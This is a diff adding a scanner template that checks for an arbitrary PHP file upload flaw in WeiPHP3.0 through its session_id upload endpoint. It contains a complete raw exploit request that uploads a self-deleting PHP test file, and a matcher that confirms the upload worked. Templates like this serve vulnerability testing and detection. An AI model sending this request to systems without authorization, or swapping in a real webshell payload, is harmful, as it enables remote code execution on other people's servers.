@@ -1,0 +1,35 @@
+id: weiphp3-sessionid-fileupload
+info:
+  name: WeiPHP3.0 session_id 任意文件上传漏洞
+  author: apple
+  severity: critical
+  description: WeiPHP3.0 session_id 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件。漏洞影响：WeiPHP3.0
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/WeiPHP3.0%20session_id%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |-
+        POST /index.php?s=/Home/File/upload/session_id/scevs8hub3m5ogla05a421hb42.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+        Content-Length: 275
+        Content-Type: multipart/form-data; boundary=------------------------WebKitFormBoundaryxoolftwc
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        --------------------------WebKitFormBoundaryxoolftwc
+        Content-Disposition: form-data; name="download"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+
+        --------------------------WebKitFormBoundaryxoolftwc--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"name":"{{filename}}.php"'
